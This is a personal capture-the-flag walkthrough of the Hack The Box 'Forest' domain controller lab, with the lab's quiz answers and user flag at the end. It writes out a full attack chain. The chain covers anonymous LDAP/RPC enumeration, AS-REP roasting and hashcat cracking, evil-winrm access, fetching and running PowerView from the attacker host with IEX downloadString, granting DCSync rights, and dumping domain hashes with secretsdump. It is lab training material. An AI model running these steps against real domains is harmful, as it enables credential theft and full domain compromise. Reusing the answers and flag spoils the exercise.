# Known
Operating System: Windows
IP Address: 10.129.65.139


# Walkthrough
## Phase 1 Enumeration
### Initial Scans
Starting off my `namp` commands.
`mkdir nmap`
`nmap -v -sV -sC -oA nmap/forest 10.129.65.157`
![[Pasted image 20260117230748.png]]
This tells me this is a `Domain Controller`
With the `Domain Name: htb.local`
**First Question: htb.local**
First steps are on to enumeration
### Enumeration
#### SMB Port 445
Starting off with what I know with `SMB`
Using `smbclient` to start looking into shares.
![[Pasted image 20260117230924.png]]
While there is no workgroup available this tells me there is `anonymous login`

#### LDAP Port 389
Looking for anonymous sign in or possible information of the system.
`ldapsearch -x -H ldap://10.129.65.157 -b "dc=htb,dc=local"`
This command told me that anonymous sign in was possible, now it is time to see if there is relevant information to pull.

`ldapsearch -x -H ldap://10.129.54.157 -b "dc=htb,dc=local" '(objectClass=Person)'`
![[Pasted image 20260117233113.png]]
Now continuing that and adding the sAMAccountName query, I was able to pull more records from ldap

`ldapsearch -x -H ldap://10.129.54.157 -b "dc=htb,dc=local" '(objectClass=Person)' sAMAccountName` 
Also adding more context like email for example
Adding a grep command will help reduce, and allow for more detailed searches like user accounts.
![[Pasted image 20260117233702.png]]
Now outputting it to a file for later use for possible password spraying attempts.
`ldapsearch -x -H ldap://10.129.65.157 -b "dc=htb,dc=local" '(objectClass=Person)' sAMAccountName | grep sAMAccountName | awk '{print $2}' > userlist.ldap`
```Bash
┌──(lazarus㉿Xerek)-[~]
└─$ cat  userlist.ldap
sebastien
lucinda
andy
mark
santi
```


### CrackmapExec and Enum4linux-ng
`crackmapexec smb 10.129.65.157 --pass-pol`
![[Pasted image 20260118120659.png]]

`enmun4linux-ng 10.129.65.157`
This command will also show the password policy, along with of ports are able to be reached
![[Pasted image 20260118121409.png]]
This command also came up with users that are not in my users folder, such as `svc-alsfresco`
![[Pasted image 20260118121900.png]]

Now that I believe we have all of the users, now I can do a bruteforce attack.
`crackmapexec smb 129.65.157 -u userlist.txt -p passlist.txt`
### RPCclient
Using the `rpcclient` command, will possibly allow for anonymous log in.
`rpcclient -U '' 10.129.65.157` (No password)
Once in, check with 
`enumdomusers`
Checking what group they are in with `queryusergroups`
`queryusergroups <rid number>`
`querygroups <rid number>`


### Impacket
To find the impacket tools.
`locate python3-impacket`
Then going to this directory
`/usr/share/doc/python3-impacket/examples`
Then the next step should be using the `getNPUsers.py`
`./GetNPUsers.py -dc-ip 10.129.65.157 -request 'htb.local/'`
```shell
┌──(lazarus㉿Xerek)-[/usr/share/doc/python3-impacket/examples]
└─$ ./GetNPUsers.py -dc-ip 10.129.65.157 -request 'htb.local/'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Name          MemberOf                                                PasswordLastSet             LastLogon                   UAC      
------------  ------------------------------------------------------  --------------------------  --------------------------  --------
svc-alfresco  CN=Service Accounts,OU=Security Groups,DC=htb,DC=local  2026-01-18 12:42:04.347164  2019-09-23 07:09:47.931194  0x410200 



$krb5asrep$23$svc-alfresco@HTB.LOCAL:2505e12e213f376eb2a15a1a3ba805ce$313270414c40c9794938b2eccb90775202404e60a43f68fc4f0004bda1fafef99ea856b2508e8c117ce4a0c8ef00502bab0af6f9cb9c3aaaa958dc151e8815c04333d489b32c6047bea2a70ce95452cd377580430abc6a5676b51b21f731423fe2a36cba1d4d31f78bf0cfc29d4bdfa73713b36a9ec41140c113792563148f3d04a5237f7a0d133be263963bccf32f37f05c1864e25e92cd0a7793a00b79ac0597a98157d5d859a47e30c8c46fd77857cc471fde8d3413d176869dadbac0e08ea8884544c4b9f3444565bae8499fadb6617ca16bcf2bc067d06c4069f6e6671af83864f0403f

```
Also adding a `-format hashcat` at the end will allow you to copy the whole hash for a hashcat crack.
Notice that the hash is `krb4asrep`
Using `hashcat` lets crack the hash.
`hashcat -m 18200 svcHash.txt /usr/share/wordlists/rockyou.txt`
```Shell
$krb5asrep$23$svc-alfresco@HTB.LOCAL:8a0eac82118ba4f8ecf091a448373a2a$4fc0a44e74c85041f98e97ee1a8b2f0a308f1b81c0a767430e5aed1a6573ccf497cc9ca97e925a7c0742f9c49914d4e6f8d7bf22d2c4f02de758c04e6633cb1762bd39231a3904b06491736603d120b4f35c11b6ef4e2ed688113cf9d1956c8cebe7a1eada2ffa0791e2004ffa15a1c986a5ccb3c1d5c84041c053626515b2742aa74723055b6d81af12d3f9abfe1836a352db5a7de696ad2da894c96b3f82fe045dd27c0a09faa3b9791668290ad0a7043f4fee3bc46b1f4fc821bca2e112925a6d44d0248bd83612c7a8c963504c931cac2dd485ee696eeef211d52dcda915ab6082588fd6:s3rvice
```
At the bottom we can see we got the password for the user `svc-alfresco:s3rvice`

### Back to Crackmapexec/Netexec
Using the `netexec` command now it is time to see what shares are available.
`netexec smb 10.129.65.157 -u svc-alfresco -p s3rvice --shares`


## Phase 2 Accessing the Machine
Looking back on my nmap scan I save in my `forest/nmap` folder, this machine has the ability for a remote desktop.
Using the `evil-winrm` command this will allow me to remote desktop in with a linux terminal
`evil-winrm -i 10.129.65.157 -u svc-alfresco -p s3rvice`
![[Pasted image 20260118205637.png]]
From there I can go to the desktop and find the file for the user flag!

Lets see if we can do some privilege escalation
`cd /usr/share/peass/winpeas`
`cp winPEASx64.exe /home/lazarus/forest/smb
`impacket-smbserver server $(pwd) -smb2support -user lazarus -password toor`
Then on the `Evil-WinRm` side
```Shell
$pass = convertto-securestring 'toor' -AsPlainText -Force
$pass
System.Security.SecureString

$cred = New-Object System.Management.Automation.PSCredential('lazarus', $pass)
$cred

UserName                     Password
--------                     --------
lazarus  System.Security.SecureString

New-PSDrive -Name lazarus -PSProvider Filesystem -Credential $cred -Root \\10.10.14.11\server

cd lazarus:
Directory: \\10.10.14.11\server


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        1/18/2026   7:08 PM       10170880 winPEASx64.exe


```
Unfortunately this did not come up with anything.


### Bloodhound
Lets see if boundhound can tell us anything.
`git clone https://github.com/BloodHoundAD/BloodHound.git`

On one terminal, launch `neo4j`
`neo4j console`
```bash
# Go to this web address to sign in to bloodhound
2026-01-19 15:35:48.325+0000 INFO  Bolt enabled on localhost:7474.

```
Upon entering the site you have to provide credentials, default are `neo4j:neo4j`. Changing them when entering I choose a new password of bloodhound to keep it simple.
Now, once logged in:
`bloodhound-python -u svc-alfresco -p s3rvice -d htb.local -ns 10.129.66.248 -c all`
Going to the uploads of bloodhound site, upload all the information.
Since we know SVC-alfresco, we can put that in the search bar, right click and mark the user as `pwned`
Then it is off to analyzation.

![[Pasted image 20260119123613.png]]
Searching for `Shortest path from owned principals`

Lets make a user, going back to our compromised account of svc-alfresco.
Make a new user with `net`
`net user lazarus roottoor /add /domain
`net group "Exchange Windows Permissions"`
`net group "Exchange Windows Permissions" /add lazarus`

`cd /opt`
`sudo git clone https://github.com/PowerShellmafia/PowerSploit/ -b dev` 
`mkdir /home/lazarus/forest/www`
`cp /Recon/Powersploit /home/lazarus/forest/www`

Hosting a python3 server to get the PowerSploit script on the target machine.
`python3 -m http.server 80`
Then an the Target machine run
`IEX(New-Object Net.WebClient).downloadString('http://10.10.14.11/PowerView.ps1')`

`$pass = convertto-securestring 'roottoor' -AsPlainText -Force`
`$cred = New-Object System.Management.Automation.PSCredential('HTB\lazarus', $pass)`

Using the LDAP format
`Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity lazarus -Rights DCSync 

Then finally on the attacker box performing a secretsdump for any type of hashes I can find.
![[Pasted image 20260119133256.png]]
`impacket-secretsdump htb.local/lazarus:roottoor@10.129.66.248`

Now that we have discovered the `administrators` hash. We can go back to `Crackmapexec` and see what can be uncovered.
![[Pasted image 20260119133806.png]]


### Making a Custom Wordlist
For this exercise...
Make a password sheet of Months/Days/Seasons, then
```Bash
┌──(lazarus㉿Xerek)-[~/forest]
└─$ for i in $(cat pass.txt ); do echo $i; echo ${i}2019; echo ${i}2020; done
```
![[Pasted image 20260118115508.png]]

# Questions
1. For which domain is this machine a Domain Controller?
	1. `htb.local`
2. Which of the following services allows for anonymous authentication and can provide us with valuable information about the machine? FTP, LDAP, SMB, WinRM
	1. `LDAP`
3. Which user has Kerberos Pre-Authentication disabled? 
	1. `svc-alfresco`
4. What is the password of the user svc-alfresco?
	1. `s3rvice`
5. To what port can we connect with these creds to get an interactive shell?
	1. `5985`
6. Submit the flag located on the svc-alfresco user's desktop.
	1. `4bf88c8ecfd86c675bc4be4e0478fb15`
7. Which group has WriteDACL permissions over the HTB.LOCAL domain? Give the group name without the `@htb.local`.